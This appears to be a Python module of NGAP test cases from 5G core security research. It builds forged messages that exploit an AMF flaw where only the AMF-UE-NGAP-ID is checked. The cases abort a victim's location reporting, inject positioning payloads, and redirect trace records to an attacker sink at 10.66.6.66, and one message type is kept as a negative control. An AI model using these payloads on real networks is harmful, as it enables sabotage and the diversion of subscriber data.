"""Catalogued NGAP encoder test cases for chunk p15-p18.

Chunk scope (batch22_firstpriority analysis):
  p15  LocationReportingFailureIndication  (NG-RAN -> AMF, Class 2, procCode 17)
  p16  UplinkUEAssociatedNRPPaTransport    (NG-RAN -> AMF, Class 2, procCode 50)
  p17  CellTrafficTrace                     (NG-RAN -> AMF, Class 2, procCode 2)
  p18  UEInformationTransfer                (Class 2, procCode 56)  -- NEGATIVE finding

p16 and p17 reuse existing builders in ``builders.py``
(``uplink_ue_associated_nrppa_transport`` / ``cell_traffic_trace``); each case
varies only the distinguishing IE values called out in the analysis tables.

p15 and p18 need NEW message shapes, defined *locally in this file* (we do NOT
edit builders.py). Both were verified against
openSource/open5gs/lib/asn1c/support/ngap-r16.7.0/38413-g70.asn:

  * LocationReportingFailureIndication (procCode 17, EP criticality ignore):
      id-AMF-UE-NGAP-ID (10, reject)  id-RAN-UE-NGAP-ID (85, reject)
      id-Cause (15, ignore)
  * UEInformationTransfer (procCode 56, EP criticality reject):
      id-FiveG-S-TMSI (26, reject, MANDATORY) + optional NB-IoT-UEPriority (210),
      UERadioCapability, S-NSSAI, AllowedNSSAI, UE-DifferentiationInfo.
      NOTE: this message is keyed by FiveG-S-TMSI, NOT by AMF-UE-NGAP-ID, so the
      "forge victim AMF-UE-NGAP-ID" bug class does NOT reach it. p18 cases are
      negative controls: valid-but-unsolicited PDUs used to confirm the AMF
      rejects/ignores them and does no AMF-UE-NGAP-ID lookup.
"""
from __future__ import annotations

from . import builders as B, ngap  # noqa: F401  (ngap used by the validate one-liner)

CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}


# ---------------------------------------------------------------- NEW builders
def location_reporting_failure_indication(amf_ue_id: int, ran_ue_id: int,
                                          cause=("radioNetwork", "unspecified")):
    """LOCATION REPORTING FAILURE INDICATION (Class 2, procedureCode 17).

    Forges a victim AMF-UE-NGAP-ID so the AMF marks a remote UE's pending Location
    Reporting Control transaction as failed. RAN-UE-NGAP-ID is attacker-chosen /
    stale; Cause steers the AMF's failure handling (retry vs abort vs upstream
    report). No NAS/container payload -> trivially forgeable if UE-context binding
    is missing.
    """
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 17, "criticality": "ignore",
        "value": ("LocationReportingFailureIndication", {"protocolIEs": ies}),
    })


def _five_g_s_tmsi(tmsi: bytes = b"\x00\x00\x00\x01", amf_set_id: int = 1,
                   amf_pointer: int = 0):
    """FiveG-S-TMSI = AMFSetID(10 bits) + AMFPointer(6 bits) + 5G-TMSI(OCTET(4))."""
    return {
        "aMFSetID": (int(amf_set_id) & 0x3FF, 10),
        "aMFPointer": (int(amf_pointer) & 0x3F, 6),
        "fiveG-TMSI": bytes(tmsi)[:4].rjust(4, b"\x00"),
    }


def ue_information_transfer(tmsi: bytes = b"\x00\x00\x00\x01", *,
                            amf_set_id: int = 1, amf_pointer: int = 0,
                            nb_iot_priority: int | None = None):
    """UE INFORMATION TRANSFER (Class 2, procedureCode 56). NEGATIVE control.

    Keyed by FiveG-S-TMSI (id 26, mandatory), not AMF-UE-NGAP-ID -> the confirmed
    AMF-UE-NGAP-ID-only lookup flaw does not apply. Sent unsolicited to confirm the
    AMF rejects/ignores it (EP criticality reject) and performs no victim-context
    lookup. Optional NB-IoT-UEPriority (id 210) exercises the extra-IE parse path.
    """
    ies = [
        {"id": 26, "criticality": "reject",
         "value": ("FiveG-S-TMSI", _five_g_s_tmsi(tmsi, amf_set_id, amf_pointer))},
    ]
    if nb_iot_priority is not None:
        ies.append({"id": 210, "criticality": "ignore",
                    "value": ("NB-IoT-UEPriority", int(nb_iot_priority))})
    return ("initiatingMessage", {
        "procedureCode": 56, "criticality": "reject",
        "value": ("UEInformationTransfer", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- cases
# Victim identifiers the attacker supplies (would be enumerated/observed in a real
# run). Kept as literals here; the point of each case is its distinguishing IEs.
_VICTIM_AMF_ID = 0x0000000000000201       # a remote UE's AMF-side context id
_VICTIM_RAN_ID = 0x00000005               # attacker-chosen / stale RAN-UE-NGAP-ID

CASES = [
    {"id": "p15-a", "msg": "LocationReportingFailureIndication",
     "desc": "Abort a remote victim's pending Location Reporting Control (location sabotage).",
     "build": lambda cfg: location_reporting_failure_indication(
         _VICTIM_AMF_ID, _VICTIM_RAN_ID, cause=("radioNetwork", "unspecified"))},
    {"id": "p16-a", "msg": "UplinkUEAssociatedNRPPaTransport",
     "desc": "Inject an NRPPa payload into the victim's LMF positioning session.",
     "build": lambda cfg: B.uplink_ue_associated_nrppa_transport(
         _VICTIM_AMF_ID, _VICTIM_RAN_ID,
         routing_id=b"\x00\x01", nrppa_pdu=bytes(range(16)))},
    {"id": "p17-a", "msg": "CellTrafficTrace",
     "desc": "Redirect a remote UE's trace metadata/records to an attacker TCE sink.",
     "build": lambda cfg: B.cell_traffic_trace(
         _VICTIM_AMF_ID, _VICTIM_RAN_ID, cfg, trace_id=b"\xaa" * 8, tce_ip="10.66.6.66")},
    # p18 UEInformationTransfer dropped: keyed by FiveG-S-TMSI, not AMF-UE-NGAP-ID
    # (the confused-deputy flaw is structurally unreachable) -> negative control.
]
